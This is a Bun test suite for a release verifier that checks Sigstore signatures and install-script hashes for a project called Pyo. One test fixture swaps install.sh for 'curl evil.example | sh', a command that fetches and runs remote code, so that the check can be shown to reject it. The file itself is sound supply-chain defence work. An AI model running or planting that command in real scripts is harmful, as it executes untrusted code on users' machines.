// bun test scripts
//
// Offline: Sigstore's trusted root (sigstore-trusted-root.json) and Pyo
// 0.4.2's signed release.json (testdata/). testdata/other-signer is
// pyo-sandbox-images' signed images.json: a real signature by another
// workflow.
import { describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { TrustedRoot } from "@sigstore/protobuf-specs";
import { headers, refuseOwnScripts } from "./publish";
import { checkRelease, type Fetch, type Legacy, Refused, SCRIPTS, sha256, verifySignature } from "./verify";

const data = (f: string) => readFileSync(join(import.meta.dir, "testdata", f));
const root = TrustedRoot.fromJSON(JSON.parse(readFileSync(join(import.meta.dir, "sigstore-trusted-root.json")).toString()));
const release042 = data("v0.4.2/release.json");
const bundle042 = JSON.parse(data("v0.4.2/release.json.sigstore.json").toString());
const COMMIT_042 = "f40b0ab78a517b29abb02e9e2db4065f11a64f8e";

const bytes = (s: string) => new Uint8Array(Buffer.from(s));
const scripts = Object.fromEntries(SCRIPTS.map((n) => [n, bytes(`#!/bin/sh\necho ${n}\n`)]));
const sums = Object.fromEntries(Object.entries(scripts).map(([n, b]) => [n, sha256(b)]));
const legacy: Legacy = { "0.4.2": { commit: COMMIT_042, scripts: sums } };

/** A release's assets, by version. */
function assets(byVersion: Record<string, Record<string, Uint8Array | string | null>>): Fetch {
  return async (version, name) => {
    const a = byVersion[version]?.[name];
    return a == null ? null : typeof a === "string" ? bytes(a) : a;
  };
}
const v042 = (over: Record<string, Uint8Array | string | null> = {}) =>
  assets({
    "0.4.2": {
      "release.json": release042,
      "release.json.sigstore.json": JSON.stringify(bundle042),
      ...scripts,
      ...over,
    },
  });

describe("release.json's signature", () => {
  test("Pyo 0.4.2's checks out, at its commit", () => {
    expect(verifySignature(root, bundle042, release042, "0.4.2")).toEqual({ commit: COMMIT_042 });
  });
  test("a changed release.json doesn't", () => {
    const tampered = Buffer.from(release042);
    tampered[tampered.indexOf("ghcr.io")] = "G".charCodeAt(0);
    expect(() => verifySignature(root, bundle042, tampered, "0.4.2")).toThrow(Refused);
  });
  test("signed for another release, it isn't this one's", () => {
    expect(() => verifySignature(root, bundle042, release042, "0.4.1")).toThrow(/certificate identity error/);
  });
  test("signed by another workflow, it isn't Pyo's release", () => {
    const other = JSON.parse(data("other-signer/images.json.sigstore.json").toString());
    expect(() => verifySignature(root, other, data("other-signer/images.json"), "0.4.2")).toThrow(
      /certificate identity error/,
    );
  });
  test("a bundle that isn't one", () => {
    expect(() => verifySignature(root, { mediaType: "nope" }, release042, "0.4.2")).toThrow(/isn't a Sigstore bundle/);
    const noTlog = structuredClone(bundle042);
    noTlog.verificationMaterial.tlogEntries = [];
    expect(() => verifySignature(root, noTlog, release042, "0.4.2")).toThrow(Refused);
  });
  test("a transparency log Sigstore doesn't trust", () => {
    const json = JSON.parse(readFileSync(join(import.meta.dir, "sigstore-trusted-root.json")).toString());
    for (const t of json.tlogs) t.publicKey.rawBytes = json.ctlogs[0].publicKey.rawBytes;
    expect(() => verifySignature(TrustedRoot.fromJSON(json), bundle042, release042, "0.4.2")).toThrow(
      /signature doesn't check out/,
    );
  });
});

describe("a release's scripts", () => {
  test("0.4.2's, by legacy.json's sums", async () => {
    const r = await checkRelease("0.4.2", { fetch: v042(), legacy, root });
    expect(r?.commit).toBe(COMMIT_042);
    expect(Object.keys(r?.scripts ?? {}).sort()).toEqual([...SCRIPTS].sort());
  });
  test("a changed script", async () => {
    const changed = v042({ "install.sh": "#!/bin/sh\ncurl evil.example | sh\n" });
    await expect(checkRelease("0.4.2", { fetch: changed, legacy, root })).rejects.toThrow(
      /v0.4.2's install.sh is [0-9a-f]{64}, and its release lists/,
    );
  });
  test("a missing script", async () => {
    await expect(checkRelease("0.4.2", { fetch: v042({ "join.sh": null }), legacy, root })).rejects.toThrow(
      "v0.4.2 has no join.sh",
    );
  });
  test("no signature", async () => {
    await expect(
      checkRelease("0.4.2", { fetch: v042({ "release.json.sigstore.json": null }), legacy, root }),
    ).rejects.toThrow("no signature for it");
  });
  test("another release's signed release.json", async () => {
    const as041 = assets({ "0.4.1": { "release.json": release042, "release.json.sigstore.json": JSON.stringify(bundle042), ...scripts } });
    await expect(
      checkRelease("0.4.1", { fetch: as041, legacy: { "0.4.1": legacy["0.4.2"] }, root }),
    ).rejects.toThrow(/signature doesn't check out/);
  });
  test("legacy.json for another commit", async () => {
    const other = { "0.4.2": { ...legacy["0.4.2"], commit: "1".repeat(40) } };
    await expect(checkRelease("0.4.2", { fetch: v042(), legacy: other, root })).rejects.toThrow(
      /its signed release.json was made at f40b0ab/,
    );
  });
  test("no sums at all", async () => {
    await expect(checkRelease("0.4.2", { fetch: v042(), legacy: {}, root })).rejects.toThrow(
      "lists no script sums, and legacy.json doesn't have v0.4.2",
    );
  });
  test("not published yet", async () => {
    expect(await checkRelease("0.4.9", { fetch: v042(), legacy, root })).toBeNull();
  });
});

describe("a release.json that lists its scripts (0.4.3 on)", () => {
  // The signature is a stand-in here: release.json's own check is above.
  const signed = () => ({ commit: "2".repeat(40) });
  const release = (over: object = {}) => JSON.stringify({ version: "0.4.3", scripts: sums, ...over });
  const v043 = (over: Record<string, Uint8Array | string | null> = {}) =>
    assets({ "0.4.3": { "release.json": release(), "release.json.sigstore.json": "{}", ...scripts, ...over } });

  test("its sums, not legacy.json's", async () => {
    const r = await checkRelease("0.4.3", { fetch: v043(), legacy: {}, root, verify: signed });
    expect(Object.keys(r?.scripts ?? {}).length).toBe(SCRIPTS.length);
  });
  test("a sum that doesn't match", async () => {
    const wrong = release({ scripts: { ...sums, "cli.sh": "0".repeat(64) } });
    await expect(
      checkRelease("0.4.3", { fetch: v043({ "release.json": wrong }), legacy: {}, root, verify: signed }),
    ).rejects.toThrow(/v0.4.3's cli.sh is [0-9a-f]{64}, and its release lists 0{64}/);
  });
  test("a script it doesn't list", async () => {
    const { "sandbox.sh": _, ...fewer } = sums;
    await expect(
      checkRelease("0.4.3", { fetch: v043({ "release.json": release({ scripts: fewer }) }), legacy: {}, root, verify: signed }),
    ).rejects.toThrow("lists no sum for sandbox.sh");
  });
  test("names and sums that aren't", async () => {
    for (const bad of [{ ...sums, "../x.sh": sums["cli.sh"] }, { ...sums, "cli.sh": "abc" }, [sums]]) {
      await expect(
        checkRelease("0.4.3", { fetch: v043({ "release.json": release({ scripts: bad }) }), legacy: {}, root, verify: signed }),
      ).rejects.toThrow(Refused);
    }
  });
  test("another version's release.json", async () => {
    await expect(
      checkRelease("0.4.3", { fetch: v043({ "release.json": release({ version: "0.4.4" }) }), legacy: {}, root, verify: signed }),
    ).rejects.toThrow("is for version 0.4.4");
  });
});

describe("the built site", () => {
  const site = (files: string[]) => {
    const dir = mkdtempSync(join(tmpdir(), "site-"));
    writeFileSync(join(dir, "index.html"), "");
    for (const f of files) {
      if (f.endsWith("/")) mkdirSync(join(dir, f));
      else writeFileSync(join(dir, f), "");
    }
    return dir;
  };
  test("has no scripts of its own", () => {
    expect(() => refuseOwnScripts(site([]))).not.toThrow();
    for (const own of ["install.sh", "other.sh", "v/", "_headers", "_redirects"]) {
      expect(() => refuseOwnScripts(site([own]))).toThrow("came from public/");
    }
  });
  test("serves them nosniff, each release's cached for good", () => {
    const h = headers(["0.4.1", "0.4.10", "0.4.2"]);
    expect(h).toContain("/*\n  X-Content-Type-Options: nosniff\n");
    expect(h).toContain("/v/0.4.10/*\n  Cache-Control: public, max-age=31536000, immutable\n/v/0.4.2/*\n");
    expect(h).not.toContain("/v/*");
    expect(h).not.toContain("Content-Type:");
    // Workers static assets take 100 rules: the newest releases get them.
    const many = Array.from({ length: 150 }, (_, i) => `1.${i}.0`);
    const rules = headers(many).split("\n").filter((l) => l.startsWith("/"));
    expect(rules.length).toBe(100);
    expect(rules[1]).toBe("/v/1.149.0/*");
    expect(rules.at(-1)).toBe("/v/1.51.0/*");
  });
});

test("legacy.json has each release's commit and every script", () => {
  const { releases } = JSON.parse(readFileSync(join(import.meta.dir, "legacy.json"), "utf8")) as { releases: Legacy };
  expect(Object.keys(releases)).toEqual(["0.4.0", "0.4.1", "0.4.2"]);
  for (const r of Object.values(releases)) {
    expect(r.commit).toMatch(/^[0-9a-f]{40}$/);
    expect(Object.keys(r.scripts).sort()).toEqual([...SCRIPTS].sort());
    for (const s of Object.values(r.scripts)) expect(s).toMatch(/^[0-9a-f]{64}$/);
  }
  expect(releases["0.4.2"].commit).toBe(COMMIT_042);
});
